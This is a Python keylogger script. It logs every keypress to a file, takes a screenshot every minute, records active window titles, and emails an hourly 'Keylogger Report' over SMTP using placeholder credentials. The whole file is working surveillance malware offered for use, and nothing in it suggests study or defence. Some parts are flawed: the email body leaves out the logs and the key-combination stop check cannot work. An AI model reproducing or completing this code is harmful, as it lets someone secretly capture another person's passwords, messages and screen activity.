import time
import pyautogui
import pygetwindow as gw
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Listener, Key, KeyCode

log_file = 'keylog.txt'
screenshot_interval = 60  # Capture a screenshot every 60 seconds
window_log_file = 'window_log.txt'
window_check_interval = 10  # Check the focused window every 10 seconds
sender_email = 'your_email@example.com'
receiver_email = 'recipient_email@example.com'
smtp_server = 'smtp.example.com'
smtp_port = 587
smtp_username = 'your_username'
smtp_password = 'your_password'
report_interval = 3600  # Send an email report every 1 hour

# Function to handle keypress events
def on_press(key):
    with open(log_file, 'a') as f:
        f.write(str(key) + '\n')

# Function to capture a screenshot
def capture_screenshot():
    timestamp = time.strftime('%Y%m%d%H%M%S', time.localtime())
    screenshot_file = f'screenshot_{timestamp}.png'
    pyautogui.screenshot(screenshot_file)

# Function to log the focused window
def log_focused_window():
    focused_window = gw.getActiveWindow()
    with open(window_log_file, 'a') as f:
        f.write(f'{focused_window.title}\n')

# Function to send an email report
def send_email_report():
    subject = 'Keylogger Report'
    message = 'Here is the report for the past hour:\n\n'  # Add relevant information from the logs

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.send_message(msg)

# Start the keylogger
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Start capturing screenshots
def start_screenshot_capture():
    while True:
        capture_screenshot()
        time.sleep(screenshot_interval)

# Start logging the focused window
def start_window_logging():
    while True:
        log_focused_window()
        time.sleep(window_check_interval)

# Start sending email reports
def start_email_reports():
    while True:
        send_email_report()
        time.sleep(report_interval)

# Create a loop to stop the program when a specific key combination is pressed (e.g., Ctrl + Alt + X)
def check_stop_condition():
    with Listener(on_press=on_press) as listener:
        listener.join()
        if Key.ctrl_l and Key.alt_l and KeyCode.from_char('x'):
            return False

# Run the keylogger program
def run_keylogger_program():
    # Start all the functionalities in separate threads
    import threading
    threads = [
        threading.Thread(target=start_keylogger),
        threading.Thread(target=start_screenshot_capture),
        threading.Thread(target=start_window_logging),
        threading.Thread(target=start_email_reports),
        threading.Thread(target=check_stop_condition)
    ]

    # Start the threads
    for thread in threads:
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

run_keylogger_program()

